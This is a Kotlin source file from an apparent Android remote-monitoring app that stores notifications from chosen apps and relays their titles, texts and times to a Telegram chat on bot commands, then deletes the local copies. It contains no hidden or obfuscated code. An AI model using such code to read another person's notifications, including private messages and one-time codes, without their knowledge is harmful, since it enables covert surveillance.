package com.save.me

import android.content.Context
import android.content.pm.PackageManager
import android.text.format.DateFormat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

object NotificationRelay {
    private const val TAG = "NotificationRelay"
    private const val PREFS_NAME = "noti_relay_prefs"
    private const val NOTI_HISTORY_PREFS = "noti_history_prefs_json"
    private const val KEY_ALLOWED_APPS = "allowed_apps"
    private const val KEY_NOTI_EXPORT = "noti_export"
    private const val MAX_HISTORY = 1000
    private const val BUTTONS_PER_ROW = 2
    private const val APPS_PER_BATCH = 30

    // --- Allowed apps management ---

    fun getAllowedApps(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(KEY_ALLOWED_APPS, emptySet()) ?: emptySet()
    }

    fun addAllowedApp(context: Context, pkg: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val set = getAllowedApps(context).toMutableSet()
        set.add(pkg)
        prefs.edit().putStringSet(KEY_ALLOWED_APPS, set).apply()
    }

    fun removeAllowedApp(context: Context, pkg: String) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val set = getAllowedApps(context).toMutableSet()
        set.remove(pkg)
        prefs.edit().putStringSet(KEY_ALLOWED_APPS, set).apply()
    }

    fun clearAllowedApps(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_ALLOWED_APPS).apply()
    }

    // --- Notification export history ---

    fun getExportHistory(context: Context): JSONArray {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val str = prefs.getString(KEY_NOTI_EXPORT, "[]") ?: "[]"
        return try {
            JSONArray(str)
        } catch (e: Exception) {
            JSONArray()
        }
    }

    fun addToExportHistory(context: Context, obj: JSONObject) {
        val arr = getExportHistory(context)
        if (arr.length() >= MAX_HISTORY) {
            val newArr = JSONArray()
            for (i in 1 until arr.length()) newArr.put(arr.getJSONObject(i))
            newArr.put(obj)
            saveExportHistory(context, newArr)
        } else {
            arr.put(obj)
            saveExportHistory(context, arr)
        }
    }

    fun saveExportHistory(context: Context, arr: JSONArray) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putString(KEY_NOTI_EXPORT, arr.toString()).apply()
    }

    fun clearExportHistory(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().remove(KEY_NOTI_EXPORT).apply()
    }

    // --- Robust label fetch ---
    private fun getAppLabel(pm: PackageManager, pkg: String): String {
        return try {
            val info = pm.getApplicationInfo(pkg, 0)
            val label = pm.getApplicationLabel(info)
            label?.toString() ?: pkg
        } catch (e: Exception) {
            pkg
        }
    }

    // --- Apps that have posted notifications (history exists) ---
    private fun getPackagesWithNotificationHistory(context: Context): List<String> {
        val prefs = context.getSharedPreferences(NOTI_HISTORY_PREFS, Context.MODE_PRIVATE)
        return prefs.all.keys.filter { it.startsWith("history_") }
            .map { it.removePrefix("history_") }
            .distinct()
    }

    // --- Build Inline Keyboard for a batch of apps ---
    private fun buildAppsInlineKeyboard(pm: PackageManager, pkgs: List<String>, callbackType: String): String {
        val buttons = pkgs.map { pkg ->
            val label = getAppLabel(pm, pkg)
            val cbdata = "$callbackType:$pkg"
            """{"text":"$label","callback_data":"$cbdata"}"""
        }
        val rows = buttons.chunked(BUTTONS_PER_ROW).map { "[${it.joinToString(",")}]" }
        return """{"inline_keyboard":[${rows.joinToString(",")}]}"""
    }

    // --- Tracked apps (whitelisted) ---
    private fun getTrackedApps(context: Context): List<String> {
        return getAllowedApps(context).toList()
    }

    // --- Handlers ---

    fun handleNotiAddPick(context: Context, chatId: String, pkg: String) {
        addAllowedApp(context, pkg)
        val pm = context.packageManager
        val label = getAppLabel(pm, pkg)
        UploadManager.sendTelegramMessage(chatId, "Added app: $label ($pkg)")
    }

    fun handleNotiRemovePick(context: Context, chatId: String, pkg: String) {
        removeAllowedApp(context, pkg)
        val pm = context.packageManager
        val label = getAppLabel(pm, pkg)
        UploadManager.sendTelegramMessage(chatId, "Removed app: $label ($pkg)")
    }

    // /notiadd: show all apps with notifications, send batches sequentially
    fun handleNotiAdd(context: Context, chatId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val pm = context.packageManager
            val pkgs = getPackagesWithNotificationHistory(context)
                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
            if (pkgs.isEmpty()) {
                UploadManager.sendTelegramMessage(chatId, "No apps have posted notifications yet.")
                return@launch
            }
            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiaddpick")
                val message = if (idx == 0)
                    "Select an app to add for notification relay:"
                else
                    "More apps to add for notification relay:"
                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
            }
        }
    }

    // /notiremove: show all whitelisted apps, send batches sequentially
    fun handleNotiRemove(context: Context, chatId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val pm = context.packageManager
            val pkgs = getTrackedApps(context)
                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
            if (pkgs.isEmpty()) {
                UploadManager.sendTelegramMessage(chatId, "No apps are being relayed.")
                return@launch
            }
            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiremovepick")
                val message = if (idx == 0)
                    "Select an app to remove from notification relay:"
                else
                    "More apps to remove from notification relay:"
                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
            }
        }
    }

    // /noti: show whitelisted apps and their notification count, send batches sequentially
    fun handleNoti(context: Context, chatId: String) {
        val pm = context.packageManager
        val allowed = getTrackedApps(context)
        if (allowed.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No apps are being relayed. Use /notiadd to add.")
            return
        }
        val pkgsSorted = allowed.sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
        pkgsSorted.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
            val sb = StringBuilder()
            if (idx == 0)
                sb.append("Relaying notifications for:\n")
            else
                sb.append("More relayed apps:\n")
            batch.forEachIndexed { i, pkg ->
                val label = getAppLabel(pm, pkg)
                val notiCount = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg).size
                sb.append("${i + 1}. $label ($pkg) $notiCount\n")
            }
            val keyboard = buildAppsInlineKeyboard(pm, batch, "notipick")
            UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, sb.toString(), keyboard)
        }
    }

    fun handleNotiPick(context: Context, chatId: String, pkg: String) {
        val pm = context.packageManager
        val label = getAppLabel(pm, pkg)
        val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
        if (notis.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No notifications for $label.")
            return
        }
        // Deduplicate consecutive duplicates (title, text, time)
        val deduped = mutableListOf<JSONObject>()
        var last: JSONObject? = null
        for (current in notis) {
            if (last == null ||
                current.optString("title") != last.optString("title") ||
                current.optString("text") != last.optString("text") ||
                current.optLong("time") != last.optLong("time")
            ) {
                deduped.add(current)
            }
            last = current
        }
        // Telegram message limit is 4096 chars per message
        val maxLen = 4096
        val header = "Recent notifications for $label:\n\n"
        var sb = StringBuilder()
        sb.append(header)
        var part = 1
        var sentAny = false
        deduped.forEachIndexed { idx, obj ->
            val title = obj.optString("title")
            val text = obj.optString("text")
            val time = obj.optLong("time")
            val date = DateFormat.format("yyyy-MM-dd HH:mm", Date(time)).toString()
            val entry = "${idx + 1}. $title\n$text\n$date\n\n"
            if (sb.length + entry.length > maxLen) {
                UploadManager.sendTelegramMessage(chatId, sb.toString())
                sentAny = true
                sb = StringBuilder()
                sb.append("Cont'd notifications for $label (part ${++part}):\n\n")
            }
            sb.append(entry)
        }
        if (sb.isNotEmpty()) {
            UploadManager.sendTelegramMessage(chatId, sb.toString())
            sentAny = true
        }
        NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
    }

    fun handleNotiClearPick(context: Context, chatId: String, pkg: String) {
        NotificationListenerServiceImpl.clearNotificationsForPackage(context, pkg)
        val pm = context.packageManager
        val label = getAppLabel(pm, pkg)
        UploadManager.sendTelegramMessage(chatId, "Cleared notifications for $label.")
    }

    // /noticlear: show whitelisted apps, send batches sequentially
    fun handleNotiClear(context: Context, chatId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val pm = context.packageManager
            val pkgs = getTrackedApps(context)
                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
            if (pkgs.isEmpty()) {
                UploadManager.sendTelegramMessage(chatId, "No apps to clear notifications for.")
                return@launch
            }
            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
                val keyboard = buildAppsInlineKeyboard(pm, batch, "noticlearpick")
                val message = if (idx == 0)
                    "Select an app to clear notifications:"
                else
                    "More apps to clear notifications:"
                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
            }
        }
    }

    fun handleNotiExportPick(context: Context, chatId: String, pkg: String) {
        val notis = NotificationListenerServiceImpl.getHistoryForPackage(context, pkg)
        if (notis.isEmpty()) {
            UploadManager.sendTelegramMessage(chatId, "No notifications to export for $pkg.")
            return
        }
        val pm = context.packageManager
        val label = getAppLabel(pm, pkg)
        val deduped = mutableListOf<JSONObject>()
        var last: JSONObject? = null
        for (current in notis) {
            if (last == null ||
                current.optString("title") != last.optString("title") ||
                current.optString("text") != last.optString("text") ||
                current.optLong("time") != last.optLong("time")
            ) {
                deduped.add(current)
            }
            last = current
        }
        val sb = StringBuilder()
        sb.append("Notification export for $label ($pkg):\n\n")
        deduped.forEachIndexed { idx, obj ->
            val title = obj.optString("title")
            val text = obj.optString("text")
            val time = obj.optLong("time")
            val date = DateFormat.format("yyyy-MM-dd HH:mm", Date(time)).toString()
            sb.append("${idx + 1}. $title\n$text\n$date\n\n")
        }
        UploadManager.sendTelegramMessage(chatId, sb.toString())
    }

    // /notiexport: show whitelisted apps, send batches sequentially
    fun handleNotiExport(context: Context, chatId: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val pm = context.packageManager
            val pkgs = getTrackedApps(context)
                .sortedBy { getAppLabel(pm, it).lowercase(Locale.getDefault()) }
            if (pkgs.isEmpty()) {
                UploadManager.sendTelegramMessage(chatId, "No apps to export notifications for.")
                return@launch
            }
            pkgs.chunked(APPS_PER_BATCH).forEachIndexed { idx, batch ->
                val keyboard = buildAppsInlineKeyboard(pm, batch, "notiexportpick")
                val message = if (idx == 0)
                    "Select an app to export notifications:"
                else
                    "More apps to export notifications:"
                UploadManager.sendTelegramMessageWithInlineKeyboard(chatId, message, keyboard)
            }
        }
    }
}